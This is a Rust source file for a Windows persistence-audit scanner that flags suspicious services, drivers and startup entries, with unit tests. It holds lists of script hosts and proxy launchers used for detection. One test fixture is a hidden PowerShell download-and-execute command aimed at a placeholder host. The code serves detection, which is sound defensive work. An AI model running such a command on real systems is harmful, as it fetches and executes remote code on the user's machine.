//! Persistence audit: services, drivers and startup entries. Detection only.
//!
//! Each entry's file is resolved from its registered command line and checked
//! for: a missing file, a temp or user-writable location, its Authenticode
//! signature, a URL in the command, and script hosts used as the launcher.
//! The kernel's view of drivers is checked in `driver_audit`.

use crate::findings::{Finding, ScanReport, Severity, sort_findings};
use crate::inventory::{SystemInventory, image_path_from_command};
use crate::process_inventory::{KnownDirs, PathClass, classify_path};
use crate::signature::{SignatureCache, SignatureInfo, SignatureState};
use crate::winutil::now_unix;
use std::time::Instant;

pub const MODULE: &str = "persistence_audit";
pub const KIND: &str = "persistence";

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum EntryKind {
    Service,
    Driver,
    Startup,
}

impl EntryKind {
    fn noun(self) -> &'static str {
        match self {
            EntryKind::Service => "Service",
            EntryKind::Driver => "Driver",
            EntryKind::Startup => "Startup entry",
        }
    }
}

/// Finding subject for an entry; the dashboard uses it to flag rows.
pub fn subject(kind: EntryKind, name: &str, location: &str) -> String {
    match kind {
        EntryKind::Service => format!("service {name}"),
        EntryKind::Driver => format!("driver {name}"),
        EntryKind::Startup => format!("startup {name} ({location})"),
    }
}

const SCRIPT_HOSTS: &[&str] = &["powershell.exe", "pwsh.exe", "wscript.exe", "cscript.exe", "mshta.exe"];
const PROXY_LAUNCHERS: &[&str] = &["rundll32.exe", "regsvr32.exe"];

pub struct Entry<'a> {
    pub kind: EntryKind,
    pub name: &'a str,
    pub location: &'a str,
    pub command: &'a str,
    pub running: bool,
    /// Resolved file and whether it exists.
    pub file: Option<(&'a str, bool)>,
    pub class: Option<PathClass>,
    pub signature: Option<&'a SignatureInfo>,
}

/// Pure rule set for one entry.
pub fn assess(e: &Entry) -> Vec<Finding> {
    let subject = subject(e.kind, e.name, e.location);
    let noun = e.kind.noun();
    let mut out = Vec::new();
    let existing = e.file.filter(|(_, exists)| *exists).map(|(f, _)| f.to_string());
    let mut push = |severity, title: String, detail: String| {
        out.push(Finding { file: existing.clone(), ..Finding::new(MODULE, severity, &subject, title).detail(detail) });
    };
    let command = e.command.to_lowercase();
    if command.contains("http://") || command.contains("https://") {
        push(Severity::High, format!("{noun} command references a URL"), e.command.to_string());
    }
    if e.kind == EntryKind::Startup
        && let Some((file, _)) = e.file
    {
        let launcher = file.rsplit('\\').next().unwrap_or(file).to_lowercase();
        if SCRIPT_HOSTS.contains(&launcher.as_str()) {
            push(Severity::Medium, format!("Startup entry runs script host {launcher}"), e.command.to_string());
        } else if PROXY_LAUNCHERS.contains(&launcher.as_str()) {
            push(Severity::Low, format!("Startup entry runs through {launcher}"), e.command.to_string());
        }
    }
    let Some((file, exists)) = e.file else { return out };
    if e.kind == EntryKind::Startup && exists {
        let extension = file.rsplit('.').next().unwrap_or("").to_lowercase();
        let severity = match extension.as_str() {
            "vbs" | "vbe" | "js" | "jse" | "wsf" | "ps1" | "hta" => Some(Severity::Medium),
            "bat" | "cmd" => Some(Severity::Low),
            _ => None,
        };
        if let Some(severity) = severity {
            push(severity, format!("Startup entry runs a .{extension} script"), file.to_string());
            return out;
        }
    }
    if !exists {
        let severity = match (e.kind, e.running) {
            (EntryKind::Driver, true) => Severity::High,
            (EntryKind::Driver, false) => return out, // Stale registrations of stopped drivers are common.
            _ => Severity::Low,
        };
        push(severity, format!("{noun} points to a missing file"), format!("{file} (command: {})", e.command));
        return out;
    }
    let unsigned = e.signature.is_some_and(|s| s.state.lacks_assurance());
    if let Some(sig) = e.signature.filter(|s| s.state == SignatureState::Invalid) {
        push(Severity::High, format!("{noun} file's signature does not verify"), format!("{file}: {}", sig.summary()));
    }
    match e.class {
        Some(PathClass::TempOrDownloads) => {
            push(Severity::High, format!("{noun} runs from a temp/download folder"), file.to_string());
        }
        Some(PathClass::UserWritable) => {
            let severity = match (e.kind, unsigned) {
                (EntryKind::Startup, true) => Severity::Medium,
                (EntryKind::Startup, false) => return out, // Per-user apps (chat, sync clients) live here.
                // ProgramData also holds locked-down signed services (Microsoft Defender's platform).
                (EntryKind::Service, false) => return out,
                (_, true) => Severity::High,
                (_, false) => Severity::Low,
            };
            let what = if unsigned { "an unsigned file in a user-writable folder" } else { "a file in a user-writable folder" };
            push(severity, format!("{noun} uses {what}"), file.to_string());
        }
        Some(PathClass::Other) if e.kind == EntryKind::Driver && e.running && !unsigned => {
            push(Severity::Low, "Running driver loads from outside Windows and Program Files".into(), file.to_string());
        }
        _ if unsigned => {
            let severity = match (e.kind, e.running, e.class) {
                (EntryKind::Driver, true, _) => Severity::High,
                (EntryKind::Driver, false, _) => Severity::Medium,
                (EntryKind::Service, _, Some(PathClass::Windows)) => Severity::Medium,
                _ => Severity::Low,
            };
            let state = if e.kind == EntryKind::Driver && e.running { "Running driver" } else { noun };
            push(severity, format!("{state} file is unsigned"), file.to_string());
        }
        _ => {}
    }
    out
}

pub fn scan(inv: &SystemInventory, cache: &mut SignatureCache, dirs: &KnownDirs) -> ScanReport {
    let started = Instant::now();
    let mut findings = Vec::new();
    let mut checked = 0;
    let mut evaluate = |kind: EntryKind, name: &str, location: &str, command: &str, running: bool, cache: &mut SignatureCache| {
        let mut resolved = image_path_from_command(command);
        // Startup-folder shortcuts: judge the program they open, not the .lnk file.
        if let Some(path) = resolved.clone().filter(|p| p.to_lowercase().ends_with(".lnk")) {
            resolved = std::fs::read(&path).ok().and_then(|bytes| crate::inventory::shortcut_target(&bytes));
        }
        let exists = resolved.as_deref().is_some_and(|f| std::path::Path::new(f).exists());
        let class = resolved.as_deref().map(|f| classify_path(f, dirs));
        // Stopped drivers are only checked for location; signatures of hundreds of
        // inactive drivers would dominate the scan time.
        let wants_signature = exists && (kind != EntryKind::Driver || running);
        let signature = if wants_signature { resolved.as_deref().and_then(|f| cache.get(f)) } else { None };
        checked += 1;
        findings.extend(assess(&Entry {
            kind,
            name,
            location,
            command,
            running,
            file: resolved.as_deref().map(|f| (f, exists)),
            class,
            signature: signature.as_ref(),
        }));
    };
    for s in &inv.services {
        evaluate(EntryKind::Service, &s.name, "", &s.binary_path, s.state.eq_ignore_ascii_case("running"), cache);
    }
    for d in &inv.drivers {
        evaluate(EntryKind::Driver, &d.name, "", &d.binary_path, d.state.eq_ignore_ascii_case("running"), cache);
    }
    for a in &inv.startup {
        evaluate(EntryKind::Startup, &a.name, &a.location, &a.command, false, cache);
    }
    let drivers = crate::driver_audit::scan(inv, cache, dirs);
    findings.extend(drivers.findings);
    let summary = format!(
        "Persistence: {checked} entries ({} services, {} drivers, {} startup), {} finding(s). {}",
        inv.services.len(),
        inv.drivers.len(),
        inv.startup.len(),
        findings.len(),
        drivers.summary
    );
    for e in &inv.errors {
        findings.push(Finding::new(MODULE, Severity::Low, "inventory", "Part of the inventory could not be read").detail(e.clone()));
    }
    sort_findings(&mut findings);
    ScanReport {
        kind: KIND.into(),
        scanned_unix: now_unix(),
        duration_ms: started.elapsed().as_millis(),
        summary,
        findings,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sig(state: SignatureState) -> SignatureInfo {
        SignatureInfo { state, signer: String::new(), via_catalog: false, status_code: 0 }
    }

    fn entry<'a>(kind: EntryKind, command: &'a str, file: Option<(&'a str, bool)>, class: Option<PathClass>, signature: Option<&'a SignatureInfo>) -> Entry<'a> {
        Entry { kind, name: "x", location: "HKCU Run", command, running: true, file, class, signature }
    }

    fn severities(findings: &[Finding]) -> Vec<Severity> {
        findings.iter().map(|f| f.severity).collect()
    }

    #[test]
    fn clean_signed_entries_are_quiet() {
        let valid = sig(SignatureState::Valid);
        let e = entry(EntryKind::Service, r"C:\Windows\System32\svchost.exe -k netsvcs", Some((r"C:\Windows\System32\svchost.exe", true)), Some(PathClass::Windows), Some(&valid));
        assert!(assess(&e).is_empty());
        let e = entry(EntryKind::Startup, r#""C:\Users\a\AppData\Local\ExampleChat\Update.exe""#, Some((r"C:\Users\a\AppData\Local\ExampleChat\Update.exe", true)), Some(PathClass::UserWritable), Some(&valid));
        assert!(assess(&e).is_empty(), "signed per-user startup apps are normal");
    }

    #[test]
    fn risky_entries_are_flagged() {
        let unsigned = sig(SignatureState::Unsigned);
        let e = entry(EntryKind::Startup, r"C:\Users\a\AppData\Local\Temp\x.exe", Some((r"C:\Users\a\AppData\Local\Temp\x.exe", true)), Some(PathClass::TempOrDownloads), Some(&unsigned));
        assert_eq!(severities(&assess(&e)), vec![Severity::High]);
        let e = entry(EntryKind::Service, r"C:\ProgramData\svc\svc.exe", Some((r"C:\ProgramData\svc\svc.exe", true)), Some(PathClass::UserWritable), Some(&unsigned));
        assert_eq!(severities(&assess(&e)), vec![Severity::High]);
        let e = entry(EntryKind::Driver, r"\SystemRoot\System32\drivers\bad.sys", Some((r"C:\Windows\System32\drivers\bad.sys", true)), Some(PathClass::Windows), Some(&unsigned));
        let f = assess(&e);
        assert_eq!(severities(&f), vec![Severity::High]);
        assert!(f[0].title.contains("Running driver"));
    }

    #[test]
    fn script_hosts_urls_and_missing_files() {
        let valid = sig(SignatureState::Valid);
        let command = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -c iex (iwr https://example.invalid/a)";
        let e = entry(EntryKind::Startup, command, Some((r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", true)), Some(PathClass::Windows), Some(&valid));
        let s = severities(&assess(&e));
        assert!(s.contains(&Severity::High) && s.contains(&Severity::Medium), "{s:?}");
        let mut e = entry(EntryKind::Driver, r"\SystemRoot\x.sys", Some((r"C:\Windows\x.sys", false)), Some(PathClass::Windows), None);
        assert_eq!(severities(&assess(&e)), vec![Severity::High]);
        e.running = false;
        assert!(assess(&e).is_empty());
    }

    #[test]
    fn running_drivers_outside_windows_are_noted() {
        let valid = sig(SignatureState::Valid);
        let e = entry(EntryKind::Driver, r"\??\D:\Tools\hw.sys", Some((r"D:\Tools\hw.sys", true)), Some(PathClass::Other), Some(&valid));
        assert_eq!(severities(&assess(&e)), vec![Severity::Low]);
        let e = entry(EntryKind::Driver, r"\SystemRoot\System32\drivers\ok.sys", Some((r"C:\Windows\System32\drivers\ok.sys", true)), Some(PathClass::Windows), Some(&valid));
        assert!(assess(&e).is_empty());
    }

    #[test]
    fn startup_scripts_are_flagged() {
        let e = entry(EntryKind::Startup, r"C:\Users\a\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\x.vbs", Some((r"C:\Users\a\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\x.vbs", true)), Some(PathClass::UserWritable), None);
        let f = assess(&e);
        assert_eq!(severities(&f), vec![Severity::Medium]);
        assert!(f[0].title.contains(".vbs"));
    }

    #[test]
    fn subjects_are_stable() {
        assert_eq!(subject(EntryKind::Service, "Spooler", ""), "service Spooler");
        assert_eq!(subject(EntryKind::Startup, "OneDrive", "HKCU Run"), "startup OneDrive (HKCU Run)");
    }
}
